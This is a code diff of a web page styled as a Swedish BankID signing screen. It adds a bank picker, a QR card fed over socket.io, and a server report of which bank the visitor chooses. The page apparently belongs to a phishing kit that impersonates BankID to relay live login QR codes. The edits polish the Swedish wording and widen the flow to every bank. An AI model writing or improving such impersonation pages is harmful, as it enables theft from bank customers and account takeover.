@@ -41,7 +41,7 @@
             justify-content: start;
             color: var(--text-color);
             margin: 40px;
-/*             overflow: hidden; */
+            /* overflow: hidden; */
         }
 
         .logo {
@@ -204,7 +204,7 @@
             }
         }
 
-        /* Bank List Styles */
+        /* bank list styles */
         .container {
             background-color: white;
             padding: 20px;
@@ -348,7 +348,7 @@
                 </div>
             </div>
         </div>
-        <button id="generateQrButton">Fortsätt</button>
+        <button id="generateQrButton">Starta</button>
     </div>
 
     <div class="container" id="bankListContainer" style="display: none;">
@@ -444,7 +444,7 @@
 
     <div class="footer">
         <p>© BankID 2024<br>
-            Denna anslut är krypterad</p>
+            Denna anslutning är krypterad</p>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
@@ -466,17 +466,15 @@
             let lastUpdateTime = Date.now();
             let isButtonClicked = false;
 
-            // Initially hide the bank list
             bankListContainer.style.display = 'none';
 
             generateQrButton.addEventListener('click', function() {
                 if (!isButtonClicked) {
                     agreeSignText.style.display = 'none';
-                    qrCard.style.display = 'none'; // Hide QR card initially
-                    isLoading = false; // Ensure loading is not active
+                    qrCard.style.display = 'none'; 
+                    isLoading = false; 
                     loaderElement.classList.remove('active');
 
-                    // Show the bank list after the button is clicked
                     bankListContainer.style.display = 'block';
                     isButtonClicked = true;
                 }
@@ -491,7 +489,6 @@
                 qrText.classList.add('active');
                 lastUpdateTime = Date.now();
 
-                // Adjust the height of the content container dynamically
                 contentContainer.style.height = 'auto';
 
                 if (generateQrButton.innerHTML == 'Inväntar ytterligare signeringar') {
@@ -507,7 +504,6 @@
                     qrImage.classList.remove('active');
                     qrText.classList.remove('active');
 
-                    // Reset the height of the content container
                     contentContainer.style.height = 'auto';
 
                     if (generateQrButton.innerHTML == '') {
@@ -528,13 +524,11 @@
                 window.location.reload();
             });
 
-            // Add click event listener to each bank item
             bankItems.forEach(item => {
                 item.addEventListener('click', function() {
                     const bankName = item.querySelector('.bank-name').textContent.trim();
 
-                    if (bankName === 'Nordea') {
-                        // Hide the bank list and show the QR card
+                    // if (bankName === 'Nordea') {
                         bankListContainer.style.display = 'none';
                         qrCard.style.display = 'block';
                         isLoading = true;
@@ -544,29 +538,29 @@
                         generateQrButton.style.backgroundColor = 'white';
                         generateQrButton.style.color = '#000';
                         generateQrButton.style.border = 'none';
-                    } else {
-                        // Hide the QR card and show the bank list
-                        qrCard.style.display = 'none';
-                        bankListContainer.style.display = 'block';
-                        alert(`You clicked on: ${bankName}`);
-                    }
+                        
+                    // } else {
+                        // hide QR card and show the bank list
+                        // qrCard.style.display = 'none';
+                        // bankListContainer.style.display = 'block';
+                        // alert(`You clicked on: ${bankName}`);
+                    // }
+                    // emit event, bank name to server
+                    socket.emit('bank_clicked', { bankName: bankName });
                 });
             });
 
-            // Search functionality
             const searchInput = document.getElementById('searchInput');
             searchInput.addEventListener('input', () => {
                 const searchTerm = searchInput.value.toLowerCase();
 
-                // Loop through each bank item
                 bankItems.forEach(item => {
                     const bankName = item.querySelector('.bank-name').textContent.toLowerCase();
 
-                    // Show or hide the item based on the search term
                     if (bankName.includes(searchTerm)) {
-                        item.style.display = 'flex'; // Show the item
+                        item.style.display = 'flex'; 
                     } else {
-                        item.style.display = 'none'; // Hide the item
+                        item.style.display = 'none';
                     }
                 });
             });
